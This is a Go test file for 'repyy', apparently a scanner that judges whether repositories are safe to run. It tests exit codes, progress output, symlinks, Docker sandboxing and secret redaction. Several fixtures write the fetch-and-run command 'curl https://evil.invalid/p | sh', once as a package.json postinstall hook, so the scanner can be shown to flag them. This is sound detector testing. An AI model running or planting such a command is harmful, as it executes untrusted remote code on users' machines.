package app

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"reflect"
	"runtime"
	"strings"
	"testing"

	"github.com/Kevin-Umali/repyy/internal/intel"
	"github.com/Kevin-Umali/repyy/internal/model"
	"github.com/Kevin-Umali/repyy/internal/sandbox"
	"github.com/Kevin-Umali/repyy/internal/scan"
)

func TestMultipleTargetsAndFlagsAfterTargets(t *testing.T) {
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	clean, risky := t.TempDir(), t.TempDir()
	if err := os.WriteFile(filepath.Join(clean, "main.go"), []byte("package main\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"README.md", "LICENSE"} {
		if err := os.WriteFile(filepath.Join(clean, name), []byte("fixture\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(filepath.Join(risky, "setup.sh"), []byte("curl https://evil.invalid/p | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	var stdout, stderr bytes.Buffer
	code, err := Run([]string{"scan", clean, risky, "--format", "json", "--jobs", "2"}, &stdout, &stderr, "test")
	if err != nil {
		t.Fatal(err)
	}
	if code != 1 {
		t.Fatalf("exit = %d, want 1; output=%s", code, stdout.String())
	}
	var report model.Report
	if err := json.Unmarshal(stdout.Bytes(), &report); err != nil {
		t.Fatal(err)
	}
	if len(report.Results) != 2 {
		t.Fatalf("got %d results", len(report.Results))
	}
	if report.RulesVersion == "" || report.Intelligence.Version == "" || report.Intelligence.Source != "embedded" {
		t.Fatalf("missing scan provenance: %+v", report)
	}
	if report.Results[0].Verdict != model.VerdictNoFindings {
		t.Fatalf("clean verdict: %s", report.Results[0].Verdict)
	}
	if report.Results[1].Verdict != model.VerdictDoNotRun {
		t.Fatalf("risky verdict: %s", report.Results[1].Verdict)
	}
}

func TestBehavioralCatalogJSONMatchesSiteArtifact(t *testing.T) {
	var stdout bytes.Buffer
	code, err := Run([]string{"rules", "catalog", "--format", "json"}, &stdout, &bytes.Buffer{}, "test")
	if err != nil || code != 0 {
		t.Fatalf("catalog command: code=%d err=%v", code, err)
	}
	var actual scan.RuleCatalogDocument
	if err := json.Unmarshal(stdout.Bytes(), &actual); err != nil {
		t.Fatal(err)
	}
	if actual.SchemaVersion != "1" || actual.RulesVersion != scan.BuiltinRulesVersion || len(actual.Rules) != len(scan.BuiltinRuleCatalog()) {
		t.Fatalf("catalog metadata mismatch: %+v", actual)
	}
	artifact, err := os.ReadFile("../../site/src/data/rule-catalog.json")
	if err != nil {
		t.Fatal(err)
	}
	var siteCatalog scan.RuleCatalogDocument
	if err := json.Unmarshal(artifact, &siteCatalog); err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(actual, siteCatalog) {
		t.Fatal("site catalog differs from CLI export; regenerate the site artifact")
	}
}

func TestOperationalFailureWinsExitCode(t *testing.T) {
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	var stdout, stderr bytes.Buffer
	code, err := Run([]string{"scan", "/path/that/does/not/exist", "--format=json"}, &stdout, &stderr, "test")
	if err != nil {
		t.Fatal(err)
	}
	if code != 2 {
		t.Fatalf("exit = %d, want 2", code)
	}
}

func TestIncompleteCoverageReturnsOperationalFailure(t *testing.T) {
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	incomplete, clean := t.TempDir(), t.TempDir()
	for _, name := range []string{"first.txt", "second.txt", "third.txt", "fourth.txt"} {
		if err := os.WriteFile(filepath.Join(incomplete, name), []byte("fixture\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	for _, name := range []string{"README.md", "LICENSE"} {
		if err := os.WriteFile(filepath.Join(clean, name), []byte("fixture\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	}

	var stdout bytes.Buffer
	code, err := Run([]string{"scan", incomplete, clean, "--max-files", "3", "--format=json", "--progress=quiet"}, &stdout, &bytes.Buffer{}, "test")
	if err != nil || code != 2 {
		t.Fatalf("code=%d err=%v output=%s", code, err, stdout.String())
	}

	var report model.Report
	if err := json.Unmarshal(stdout.Bytes(), &report); err != nil {
		t.Fatal(err)
	}
	if len(report.Results) != 2 || report.Results[0].Verdict != model.VerdictIncomplete || report.Results[0].Coverage.Complete || report.Results[1].Verdict != model.VerdictNoFindings {
		t.Fatalf("unexpected results: %+v", report.Results)
	}
}

func TestUndecodableScriptExitsIncomplete(t *testing.T) {
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "run.sh"), []byte("#!/bin/sh\n#\x00\ncurl https://evil.invalid/p | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	var stdout bytes.Buffer
	code, err := Run([]string{"scan", root, "--format=json", "--progress=quiet"}, &stdout, &bytes.Buffer{}, "test")
	if err != nil || code != 2 {
		t.Fatalf("code=%d err=%v output=%s", code, err, stdout.String())
	}
	var report model.Report
	if err := json.Unmarshal(stdout.Bytes(), &report); err != nil {
		t.Fatal(err)
	}
	if len(report.Results) != 1 || report.Results[0].Verdict != model.VerdictIncomplete || report.Results[0].Coverage.Complete {
		t.Fatalf("undecodable script appeared clean: %+v", report.Results)
	}
}

func TestDirectorySymlinkKeepsRequestedNameAndFindings(t *testing.T) {
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "package.json"), []byte(`{"scripts":{"postinstall":"curl https://evil.invalid/p | sh"}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(t.TempDir(), "review")
	if err := os.Symlink(root, link); err != nil {
		t.Skipf("directory symlink unavailable: %v", err)
	}
	var stdout bytes.Buffer
	code, err := Run([]string{"scan", link, "--format=json", "--progress=quiet"}, &stdout, &bytes.Buffer{}, "test")
	if err != nil || code != 1 {
		t.Fatalf("code=%d err=%v output=%s", code, err, stdout.String())
	}
	var report model.Report
	if err := json.Unmarshal(stdout.Bytes(), &report); err != nil {
		t.Fatal(err)
	}
	if len(report.Results) != 1 || report.Results[0].Target != link || report.Results[0].Coverage.FilesScanned == 0 || len(report.Results[0].Findings) == 0 {
		t.Fatalf("symlink target lost scan findings: %+v", report.Results)
	}
}

func TestScanProgressFollowsOutputFormat(t *testing.T) {
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	target := t.TempDir()
	if err := os.WriteFile(filepath.Join(target, "main.go"), []byte("package main\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, tc := range []struct {
		name, format string
		wantProgress bool
	}{
		{"terminal", "terminal", true},
		{"machine-readable", "json", false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			var stdout, stderr bytes.Buffer
			code, err := Run([]string{"scan", target, "--format", tc.format}, &stdout, &stderr, "test")
			if err != nil || code != 0 {
				t.Fatalf("code=%d err=%v", code, err)
			}
			progress := stderr.String()
			if tc.wantProgress {
				if !strings.Contains(progress, "repyy: scanning ") || !strings.Contains(progress, "repyy: scanned ") {
					t.Fatalf("missing scan progress on stderr: %q", progress)
				}
			} else if progress != "" {
				t.Fatalf("machine-readable scan wrote progress to stderr: %q", progress)
			}
		})
	}
}

func TestScanProgressUpdateIncludesWorkCompleted(t *testing.T) {
	var stderr bytes.Buffer
	progress := &scanProgress{w: &stderr, mode: "plain", active: map[int]*scanProgressState{}}
	progress.start(0, "fixture")
	progress.update(0, 12, 1536)
	progress.printUpdates()
	if !strings.Contains(stderr.String(), "12 files, 1.5 KiB") {
		t.Fatalf("missing progress counters: %q", stderr.String())
	}
}

func TestScanProgressSanitizesTarget(t *testing.T) {
	var stderr bytes.Buffer
	progress := &scanProgress{w: &stderr, mode: "plain", active: map[int]*scanProgressState{}}
	progress.start(0, "repo\x1b[2J\napi_key=secret")
	progress.finish(0, model.RepoResult{})
	if strings.Contains(stderr.String(), "\x1b") || strings.Contains(stderr.String(), "api_key=secret") || strings.Count(stderr.String(), "repyy:") != 2 {
		t.Fatalf("progress rendered unsafe target text: %q", stderr.String())
	}
}

func TestInteractiveProgressCompactsConcurrentTargets(t *testing.T) {
	var stderr bytes.Buffer
	progress := &scanProgress{w: &stderr, mode: "interactive", active: map[int]*scanProgressState{}}
	progress.start(0, "one")
	progress.start(1, "two")
	if !strings.Contains(stderr.String(), "scanning 2 repositories") {
		t.Fatalf("missing compact concurrent progress: %q", stderr.String())
	}
}

func TestColorModeHonorsNoColor(t *testing.T) {
	if resolveColorMode("auto", true, true) {
		t.Fatal("auto color ignored NO_COLOR")
	}
	if !resolveColorMode("auto", true, false) || resolveColorMode("auto", false, false) {
		t.Fatal("auto color did not follow terminal state")
	}
	if !resolveColorMode("always", false, true) {
		t.Fatal("explicit always should override automatic color policy")
	}
}

func TestDisplayTargetRemovesURLSecrets(t *testing.T) {
	for _, tc := range []struct{ input, want string }{
		{"https://user:secret@example.com/repo.git", "https://[REDACTED]@example.com/repo.git"},
		{"https://example.com/repo.git?token=secret#fragment", "https://example.com/repo.git"},
	} {
		if got := displayTarget(tc.input); got != tc.want {
			t.Errorf("displayTarget(%q) = %q, want %q", tc.input, got, tc.want)
		}
	}
}

func TestRulesListJSONIncludesProvenance(t *testing.T) {
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	var stdout bytes.Buffer
	code, err := Run([]string{"rules", "list", "--format", "json"}, &stdout, &bytes.Buffer{}, "test")
	if err != nil || code != 0 {
		t.Fatalf("code=%d err=%v", code, err)
	}
	var result struct {
		Packages []struct {
			Source      string   `json:"source"`
			SourceURL   string   `json:"source_url"`
			Description string   `json:"description"`
			Affected    []string `json:"affected_versions"`
		} `json:"packages"`
	}
	if err := json.Unmarshal(stdout.Bytes(), &result); err != nil {
		t.Fatal(err)
	}
	if len(result.Packages) == 0 || result.Packages[0].Source == "" || result.Packages[0].SourceURL == "" || result.Packages[0].Description == "" {
		t.Fatalf("missing provenance: %#v", result.Packages)
	}
}

func TestIntelStatusAndExportAreOffline(t *testing.T) {
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	for _, args := range [][]string{{"intel", "status", "--format", "json"}, {"intel", "export"}} {
		var stdout bytes.Buffer
		code, err := Run(args, &stdout, &bytes.Buffer{}, "test")
		if err != nil || code != 0 {
			t.Fatalf("%v: code=%d err=%v", args, code, err)
		}
		if !json.Valid(stdout.Bytes()) {
			t.Fatalf("%v returned invalid JSON: %s", args, stdout.String())
		}
	}
}

func TestDockerScanKeepsSuccessfulTargetsAfterAnotherFails(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("fake Docker shell script requires Unix")
	}
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	root := t.TempDir()
	good, bad := filepath.Join(root, "good"), filepath.Join(root, "bad")
	for _, path := range []string{good, bad} {
		if err := os.Mkdir(path, 0o700); err != nil {
			t.Fatal(err)
		}
	}
	worker := model.Report{
		SchemaVersion: "1", ToolVersion: "test", RulesVersion: scan.BuiltinRulesVersion,
		Intelligence: model.IntelligenceInfo{Version: intel.SnapshotVersion, Date: intel.SnapshotDate, Source: "embedded"},
		Results:      []model.RepoResult{{Target: "/input", Verdict: model.VerdictNoFindings, Coverage: model.Coverage{Complete: true}}},
	}
	workerJSON, err := json.Marshal(worker)
	if err != nil {
		t.Fatal(err)
	}
	dockerDir := t.TempDir()
	workerFile := filepath.Join(dockerDir, "worker.json")
	if err := os.WriteFile(workerFile, workerJSON, 0o600); err != nil {
		t.Fatal(err)
	}
	script := "#!/bin/sh\ncase \"$*\" in\n  *'image inspect'*) exit 0 ;;\n  *'/bad,'*) exit 125 ;;\n  *) cat \"$FAKE_DOCKER_WORKER\"; exit 0 ;;\nesac\n"
	if err := os.WriteFile(filepath.Join(dockerDir, "docker"), []byte(script), 0o700); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", dockerDir+string(os.PathListSeparator)+os.Getenv("PATH"))
	t.Setenv("FAKE_DOCKER_WORKER", workerFile)
	oldDigest := sandbox.ImageDigest
	sandbox.ImageDigest = "sha256:" + strings.Repeat("a", 64)
	defer func() { sandbox.ImageDigest = oldDigest }()
	var stdout, stderr bytes.Buffer
	code, err := Run([]string{"scan", good, bad, "--sandbox=docker", "--format=json", "--progress=quiet"}, &stdout, &stderr, "test")
	if err != nil || code != 2 {
		t.Fatalf("code=%d err=%v output=%s", code, err, stdout.String())
	}
	var report model.Report
	if err := json.Unmarshal(stdout.Bytes(), &report); err != nil {
		t.Fatal(err)
	}
	if len(report.Results) != 2 || report.Results[0].Target != good || report.Results[1].Target != bad ||
		report.Results[0].Verdict != model.VerdictNoFindings || report.Results[0].Isolation == nil ||
		report.Results[1].Verdict != model.VerdictIncomplete || report.Results[1].Error == "" {
		t.Fatalf("mixed scan results: %+v", report.Results)
	}
}

func TestScanCanRenderHTMLDirectly(t *testing.T) {
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "README.md"), []byte("fixture\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "LICENSE"), []byte("fixture\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	var stdout bytes.Buffer
	code, err := Run([]string{"scan", root, "--format", "html", "--progress", "quiet"}, &stdout, &bytes.Buffer{}, "test")
	if err != nil || code != 0 {
		t.Fatalf("code=%d err=%v", code, err)
	}
	if !strings.Contains(stdout.String(), "<!doctype html>") || !strings.Contains(stdout.String(), "Content-Security-Policy") {
		t.Fatalf("unexpected HTML scan output: %s", stdout.String())
	}
}

func TestRulesExplainSupportsTerminalAndJSON(t *testing.T) {
	for _, format := range []string{"terminal", "json"} {
		var stdout bytes.Buffer
		args := []string{"rules", "explain", "EXEC-001", "--format", format}
		code, err := Run(args, &stdout, &bytes.Buffer{}, "test")
		if err != nil || code != 0 {
			t.Fatalf("%s: code=%d err=%v", format, code, err)
		}
		if !strings.Contains(stdout.String(), "dynamic-execution") {
			t.Fatalf("%s explanation missing metadata: %s", format, stdout.String())
		}
		if !strings.Contains(stdout.String(), "applicable_paths") && !strings.Contains(stdout.String(), "paths:") {
			t.Fatalf("%s explanation missing applicable paths: %s", format, stdout.String())
		}
	}
}

func TestDisplayFiltersDoNotChangeScanExitCode(t *testing.T) {
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "payload.sh"), []byte("curl https://evil.invalid/p | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	var stdout bytes.Buffer
	code, err := Run([]string{"scan", root, "--detail", "summary", "--min-severity", "critical", "--min-confidence", "high", "--progress", "quiet"}, &stdout, &bytes.Buffer{}, "test")
	if err != nil || code != 1 {
		t.Fatalf("code=%d err=%v output=%s", code, err, stdout.String())
	}
}
